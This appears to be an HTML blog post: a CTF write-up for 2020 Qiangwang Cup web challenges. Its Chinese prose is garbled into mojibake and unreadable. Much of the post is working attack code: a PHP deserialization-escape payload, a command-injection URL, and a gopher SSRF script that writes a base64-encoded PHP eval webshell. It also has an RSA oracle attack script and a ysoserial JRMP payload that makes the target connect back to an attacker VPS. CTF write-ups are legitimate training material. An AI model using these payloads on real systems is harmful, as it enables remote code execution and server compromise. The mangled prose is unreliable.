    <content type="html"><![CDATA[<p>æ‰“å®Œå¼ºç½‘æ¯å°±å»å­¦æ ¡æŠ¥é“äº†ï¼ŒæŠ½ç©ºè¡¥ä¸€ä¸‹wpã€‚</p><h3 id="å¼ºç½‘å…ˆé”‹-è¾…åŠ©"><a href="#å¼ºç½‘å…ˆé”‹-è¾…åŠ©" class="headerlink" title="å¼ºç½‘å…ˆé”‹-è¾…åŠ©"></a>å¼ºç½‘å…ˆé”‹-è¾…åŠ©</h3><p>ååºåˆ—åŒ–é€ƒé€¸ï¼Œå‚è€ƒ<a href="https://m0nit0r.top/2020/02/05/object-injection-caused-by-PHP-string-escape/#Joomlaé€ƒé€¸">https://m0nit0r.top/2020/02/05/object-injection-caused-by-PHP-string-escape/#Joomla%E9%80%83%E9%80%B8</a>å†åŠ ä¸Šç»•è¿‡wakeupï¼Œä»¥åŠååºåˆ—åŒ–ä¸­ä½¿ç”¨å¤§å†™Så¯ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºçš„ä¸€äº›ç»•è¿‡æ–¹å¼ã€‚</p><p>éœ€è¦æ³¨æ„è°ƒè¯•çš„æ—¶å€™æœ€å¥½urlç¼–ç ï¼Œç›´æ¥echo \0 æ— æ³•æ˜¾ç¤ºï¼Œç®—è¦†ç›–é•¿åº¦çš„æ—¶å€™å®¹æ˜“å‡ºé”™ã€‚</p><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</span><br><span class="line">   <span class="keyword">protected</span> $user;</span><br><span class="line">   <span class="keyword">protected</span> $pass;</span><br><span class="line">   <span class="keyword">protected</span> $admin;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$user, $pass, $admin = <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;pass = $pass;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;admin = $admin;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</span><br><span class="line">   <span class="keyword">protected</span> $name;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name = <span class="string">&#x27;Riven&#x27;</span></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">TP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">&quot;function&quot;</span> <span class="keyword">or</span> gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">&quot;object&quot;</span>)&#123;</span><br><span class="line">           $name = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">           $name();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;TP();</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</span><br><span class="line">   <span class="keyword">protected</span> $name;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;name !== <span class="string">&#x27;Yasuo&#x27;</span>)&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;name = <span class="string">&#x27;Yasuo&#x27;</span>;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;No Yasuo! No Soul!\n&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;Gank();</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Gank</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;name, <span class="string">&#x27;Yasuo&#x27;</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;Are you orphan?\n&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;Must Be Yasuo!\n&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</span><br><span class="line">   <span class="keyword">protected</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name = <span class="string">&quot;Lee Sin&quot;</span></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">KS</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;KS();</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">   $data = str_replace(<span class="string">&#x27;\0*\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&quot;*&quot;</span>.chr(<span class="number">0</span>), $data);</span><br><span class="line">   <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> jungle(<span class="string">&#x27;gml&#x27;</span>);</span><br><span class="line">$b = <span class="keyword">new</span> midsolo($a);</span><br><span class="line">$c = <span class="keyword">new</span> topsolo($b);</span><br><span class="line">$data = <span class="string">&#x27;O%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6eame%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%00%2A%00\6eame%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6eame%22%3Bs%3A3%3A%22gml%22%3B%7D%7D%7D&#x27;</span>;</span><br><span class="line">$data = urldecode($data);</span><br><span class="line">$data = <span class="string">&#x27;gml&quot;;s:8:&quot;password&quot;;&#x27;</span>.$data.<span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">$username = <span class="string">&#x27;gml\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&#x27;</span>;</span><br><span class="line">$password = urlencode($data);</span><br><span class="line"><span class="keyword">echo</span> $username.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $password;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="å¼ºç½‘å…ˆé”‹-ä¸»åŠ¨"><a href="#å¼ºç½‘å…ˆé”‹-ä¸»åŠ¨" class="headerlink" title="å¼ºç½‘å…ˆé”‹-ä¸»åŠ¨"></a>å¼ºç½‘å…ˆé”‹-ä¸»åŠ¨</h3><p>[<a href="http://39.96.23.228:10002/?ip=;cat%20*]">http://39.96.23.228:10002/?ip=;cat%20*]</a>(<a href="http://39.96.23.228:10002/?ip=;cat">http://39.96.23.228:10002/?ip=;cat</a> *)</p><h3 id="å¼ºç½‘å…ˆé”‹-Funhash"><a href="#å¼ºç½‘å…ˆé”‹-Funhash" class="headerlink" title="å¼ºç½‘å…ˆé”‹-Funhash"></a>å¼ºç½‘å…ˆé”‹-Funhash</h3><p>Md4é‚£ä¸ªç»•è¿‡ï¼Œéœ€è¦å­—ç¬¦0eå¼€å¤´ï¼Œåé¢éƒ½æ˜¯æ•°å­—ï¼Œå¹¶ä¸”md4çš„ç»“æœéœ€è¦æ˜¯ 0e[0-9]{30} çš„å½¢å¼ã€‚<a href="https://medium.com/@Asm0d3us/part-1-php-tricks-in-web-ctf-challenges-e1981475b3e4é‡Œé¢æœ‰ç°æˆçš„æ•°ã€‚ç¬¬äºŒå…³æ•°ç»„ç»•è¿‡ï¼Œæ•°æ®åº“é‚£ä¸ªåº”è¯¥æ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œmd5å«æœ‰">https://medium.com/@Asm0d3us/part-1-php-tricks-in-web-ctf-challenges-e1981475b3e4é‡Œé¢æœ‰ç°æˆçš„æ•°ã€‚ç¬¬äºŒå…³æ•°ç»„ç»•è¿‡ï¼Œæ•°æ®åº“é‚£ä¸ªåº”è¯¥æ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œmd5å«æœ‰</a> â€˜orâ€™è¿™ç§ï¼Œä¸€ç•ªæœç´¢åœ¨<a href="https://cvk.posthaven.com/sql-injection-with-raw-md5-hashesé‡Œæ‰¾åˆ°äº†ç°æˆçš„æ•°ã€‚[http://39.101.177.96/?hash1=0e001233333333333334557778889&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=129581926211651571912466741651878684928](http://39.101.177.96/?hash1=0e001233333333333334557778889&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=129581926211651571912466741651878684928)">https://cvk.posthaven.com/sql-injection-with-raw-md5-hashesé‡Œæ‰¾åˆ°äº†ç°æˆçš„æ•°ã€‚[http://39.101.177.96/?hash1=0e001233333333333334557778889&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=129581926211651571912466741651878684928](http://39.101.177.96/?hash1=0e001233333333333334557778889&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=129581926211651571912466741651878684928)</a></p><h3 id="half-infiltration"><a href="#half-infiltration" class="headerlink" title="half_infiltration"></a>half_infiltration</h3><p>Ob_end_clean å¯¼è‡´ä»€ä¹ˆä¹Ÿä¸ä¼šè¾“å‡ºï¼Œéœ€è¦è§¦å‘å¼‚å¸¸ç›´æ¥é€€å‡ºï¼Œæ‰èƒ½ç»•è¿‡ã€‚è¦ååºåˆ—åŒ–ä¸¤ä¸ªå¯¹è±¡ï¼Œç¬¬ä¸€ä¸ªç”¨æ¥å–åˆ°$flagï¼Œç¬¬äºŒä¸ªç”¨å…¨å±€ $this è§¦å‘å¼‚å¸¸ï¼Œè¿™æ ·å°±ä¼šè¾“å‡ºäº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $age,$sex,$num;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$age,$sex,$num</span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;num = $num;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">Array</span>(<span class="keyword">new</span> User(<span class="keyword">new</span> Pass(),<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;result&#x27;</span>),<span class="keyword">new</span> User(<span class="keyword">new</span> Pass(),<span class="string">&#x27;read&#x27;</span>,this));</span><br><span class="line"><span class="keyword">print</span> serialize($b);</span><br></pre></td></tr></table></figure><p><img src="/2020/08/28/2020-qwb/siixUdLyyYA0CgPrTYcrTGW7orUlSYJJg_fLnLixhR_ier_T5Vp-2Zmy_YK-LFgk2KQdudUfObrsfGQ9BPvh1F2kNp1AD_k_Wul3pWavrviitU88vtT9inzmxINfW0MlV4kBPqq0.png" alt="img"></p><p>UrläºŒæ¬¡ç¼–ç è¯»flagä¸æˆåŠŸï¼Œç„¶åå‘ç°40000ç«¯å£å¼€ç€webæœåŠ¡ï¼Œhtmlä»£ç å°±postä¸€ä¸ªfileå’Œcontentï¼Œåº”è¯¥æ˜¯å†™æ–‡ä»¶ã€‚æ¥ä¸‹æ¥å°±æ˜¯å†™shelläº†ï¼Œå†™äº†ä¸‰ä¸ªå¤šå°æ—¶ã€‚ã€‚ã€‚ç–¯ç‹‚å°è¯•ï¼Œå‘ç°æœ‰WAFï¼Œæ‰€ä»¥ç”¨php://filter/convert.base64-decode/resource æ­é…base64ç¼–ç æ¥å†™ï¼Œä½†æ˜¯è²Œä¼¼è¿‡æ»¤äº†=è¿™äº›ï¼Œå‡‘äº†ä¸ªæ²¡æœ‰=çš„payloadã€‚è€Œä¸”æ–‡ä»¶ä¸æ˜¯ç›´æ¥å†™åˆ°uploadsç›®å½•ï¼Œè®¿é—®index.phpè¿”å›ä¸€ä¸ªset-cookie,æ˜¯å†™åˆ°äº†PHPSESSIDçš„å€¼å¯¹åº”çš„æ–‡ä»¶å¤¹ä¸‹ï¼Œæ‰€ä»¥gopherå‘åŒ…è¦æŒ‡å®šPHPSESSIDï¼Œè¿™ä¸ªå‘äº†å¾ˆä¹…ã€‚ã€‚ç”Ÿæˆgopher payloadçš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">exp=<span class="string">&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 172.26.98.147</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:45.0) Gecko/20100101 Firefox/45.0</span></span><br><span class="line"><span class="string">Accept: */*;</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=gml</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 95</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">file=php://filter/convert.base64-decode/resource=gml.php&amp;content=PD89QGV2YWwoJF9HRVRbMl0pOz8%2b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># print exp.split(&quot;\n&quot;)</span></span><br><span class="line">tmp = urllib.quote(exp)</span><br><span class="line">tmp = tmp.replace(<span class="string">&quot;%0A&quot;</span>,<span class="string">&quot;%0D%0A&quot;</span>)</span><br><span class="line"> </span><br><span class="line">result = <span class="string">&quot;_&quot;</span>+urllib.quote(tmp)</span><br><span class="line"> </span><br><span class="line">result=<span class="string">&quot;gopher://172.26.98.147:40000/&quot;</span>+result</span><br><span class="line"><span class="built_in">print</span> result</span><br></pre></td></tr></table></figure><p>æ‰“è¿‡å»ï¼š</p><p><img src="/2020/08/28/2020-qwb/nTFCbNjiuJVHnGXR8vO8p_hnw8wsgB44Hk3gjrbQYEVFEx1rYUMWP9UjIEmDYqQRo8fC3Q-zkoPiBcOY7qs37kmP3JKvklZkh1_5gLpx275KceTenCp89k1s1KVQuYAurHMFQwfh.png" alt="img"></p><p>å¯ä»¥ getshellï¼š</p><p><img src="/2020/08/28/2020-qwb/vISYtt8fRrUQCho2750osAU6hqwZbV7_SUbI0hlWzE-YX_EqfbIXwLCASw-BmITL1Dq31AQbg3erETg5H9Mixh4l9Bn8SVNajF1ZdSHTaEJVldYycZ9gGQw2T2kb4tRoxO28fXf8.png" alt="img"></p><h3 id="Dice2cry"><a href="#Dice2cry" class="headerlink" title="Dice2cry"></a>Dice2cry</h3><p>å‘abi.phpå‘äº†postè¯·æ±‚ï¼Œæ²¡æœ‰å…¶ä»–åŠŸèƒ½ï¼Œè¯•ä¸€ä¸‹æºç æ³„æ¼ï¼Œabi.php.bakæœ‰æºç ã€‚abi.phpé‡Œæ˜¯ä¸€ä¸ªç±»ä¼¼RSA parity oracleçš„ä¸œè¥¿ï¼Œä½†æ˜¯ä»–éœ€è¦ $_POST[â€˜this_is.ableâ€™] æ¥è®¾ç½®å¯†æ–‡ç»å°è¯•ï¼Œç”¨ this[is.able å¯ä»¥ç»•è¿‡ php å¯¹ . çš„è¿‡æ»¤</p><p>è´´ä¸Šé˜Ÿå‹ mcfx å¤§ä½¬çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cookie=<span class="string">&#x27;PHPSESSID=0ctstv9ecqte01n2nkj8fi8744; encrypto_flag=79113663305747837143444307328467025244358133313438256571587025766714023427438759740177304646998782229997099583059263540140676001606304937372556988230412073815119853730057831488053981148795567089107250487727369425980217048609105153253967274624991296087058702050452905877610820679017736577755477024222115641775; public_n=8f5dc00ef09795a3efbac91d768f0bff31b47190a0792da3b0d7969b1672a6a6ea572c2791fa6d0da489f5a7d743233759e8039086bc3d1b28609f05960bd342d52bffb4ec22b533e1a75713f4952e9075a08286429f31e02dbc4a39e3332d2861fc7bb7acee95251df77c92bd293dac744eca3e6690a7d8aaf855e0807a1157; public_e=010001&#x27;</span></span><br><span class="line">hd=&#123;<span class="string">&#x27;cookie&#x27;</span>:cookie&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getval</span>(<span class="params">x</span>):</span></span><br><span class="line">dt=&#123;<span class="string">&#x27;this[is.able&#x27;</span>:x&#125;</span><br><span class="line">r=requests.post(<span class="string">&#x27;http://106.14.66.189/abi.php&#x27;</span>,headers=hd,data=dt)</span><br><span class="line"><span class="keyword">return</span> r.json()[<span class="string">&#x27;num&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cookie.split(<span class="string">&#x27;; &#x27;</span>):</span><br><span class="line">a,b=i.split(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> a==<span class="string">&#x27;encrypto_flag&#x27;</span>:</span><br><span class="line">enc_flag=<span class="built_in">int</span>(b)</span><br><span class="line"><span class="keyword">elif</span> a==<span class="string">&#x27;public_n&#x27;</span>:</span><br><span class="line">n=<span class="built_in">int</span>(b,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">elif</span> a==<span class="string">&#x27;public_e&#x27;</span>:</span><br><span class="line">e=<span class="built_in">int</span>(b,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> getval(<span class="number">0</span>)==<span class="number">0</span></span><br><span class="line"></span><br><span class="line">flag3=getval(enc_flag)</span><br><span class="line">n3=n%<span class="number">3</span></span><br><span class="line">curn=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">a=<span class="number">3</span>**(pos+<span class="number">1</span>)</span><br><span class="line">b=<span class="built_in">pow</span>(a,e,n)</span><br><span class="line">t3=getval(enc_flag*b%n)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line"><span class="keyword">if</span> (flag3*a-n3*(curn*<span class="number">3</span>+i))%<span class="number">3</span>==t3:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">curn=curn*<span class="number">3</span>+i</span><br><span class="line">l=curn*n//a</span><br><span class="line">r=(curn*n+n<span class="number">-1</span>)//a</span><br><span class="line">print(pos,l,r)</span><br><span class="line"><span class="keyword">if</span> l+<span class="number">1</span>==r:</span><br><span class="line">print(r.to_bytes(<span class="number">100</span>,<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h3><p>Jdk 1.8ï¼Œååºåˆ—åŒ–å‰æœ‰WAFã€‚å¯ä»¥ç”¨ysoserial.exploit.JRMPListener CommonsCollections7æ‰“ï¼ˆ6å’Œ7åº”è¯¥éƒ½å¯ä»¥ï¼‰ï¼Œä¸ºäº†é€ƒé¿æ£€æµ‹ï¼Œä½¿ç”¨JRMPæ¨¡æ‹ŸRMI Clientåæ‰“ï¼Œå‚è€ƒï¼š<a href="https://tiaotiaolong.net/2020/04/12/JRMPListener-&&-JRMPClientä½¿ç”¨å°è®°/">https://tiaotiaolong.net/2020/04/12/JRMPListener-&amp;&amp;-JRMPClient%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/</a>å‘½ä»¤æ‰§è¡Œå¡äº†å¾ˆä¹…ï¼Œå¥½åƒä¸èƒ½æœ‰å¼•å·ï¼Œsh -c åé¢çš„å‘½ä»¤ç©ºæ ¼ç”¨${IFS}ä¹Ÿæ­»æ´»ä¸è¡Œï¼Œæœ€åå‚è€ƒ<a href="https://chybeta.github.io/2017/08/15/å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›ç»•è¿‡æŠ€å·§/">https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a>ï¼Œç”¨$IFS$9æ‰å¯ä»¥ã€‚ã€‚ã€‚æµ‹è¯•çš„æ—¶å€™æ¯æ¬¡è¿˜éœ€è¦æ¢ç«¯å£ï¼Œä¸€ä¸ªç«¯å£ç¬¬äºŒæ¬¡å°±ä¸å¥½ç”¨äº†ï¼Œæ²¡æœ‰å›è¿ã€‚Vps ä¸Šæ‰§è¡Œï¼š</p><p><img src="/2020/08/28/2020-qwb/mx6vGXjZXUUflp5AP0Z0WvoOtC5ZqvWK6uTonALgu4hge9t9ICuU2ddWXRjjfExkb189jfdGr7utxt0CRxTxH8Ie8nwG61orWAHMTptSErbdA_pJv7Fm7FFCA3TpovnWcR86eEFO.png" alt="img"></p><p>å¼€å¯serverï¼Œç„¶åæœ¬åœ°ç”Ÿæˆpayloadï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar JRMPClient <span class="string">&#x27;vps:5562&#x27;</span> &gt; payload</span><br></pre></td></tr></table></figure><p>ç„¶åæœ¬åœ°å†æ‰“è¿‡å»ï¼Œè§¦å‘ååºåˆ—åŒ–:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line">proxy = &#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line">exp = <span class="built_in">open</span>(<span class="string">&#x27;payload&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"> </span><br><span class="line">requests.post(<span class="string">&quot;http://39.101.166.142:8080/jdk_der&quot;</span>,data=exp,proxies=proxy)</span><br></pre></td></tr></table></figure><p>è®¿é—®æ—¥å¿—:</p><p><img src="/2020/08/28/2020-qwb/1.png" alt="img"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ‰“å®Œå¼ºç½‘æ¯å°±å»å­¦æ ¡æŠ¥é“äº†ï¼ŒæŠ½ç©ºè¡¥ä¸€ä¸‹wpã€‚&lt;/p&gt;
